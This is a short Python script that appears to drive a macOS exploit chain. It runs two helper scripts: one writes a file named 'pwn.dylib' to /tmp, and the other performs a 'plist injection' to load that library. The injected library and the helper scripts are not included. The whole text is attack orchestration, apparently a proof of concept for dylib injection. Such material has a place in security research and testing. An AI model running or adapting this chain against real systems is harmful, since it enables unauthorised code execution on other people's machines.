#!/usr/bin/env python3
import os

os.system('./1_write_file.py ./pwn.dylib /tmp/pwn.dylib')
os.system('./2_plist_injection.py --dylib /tmp/pwn.dylib')
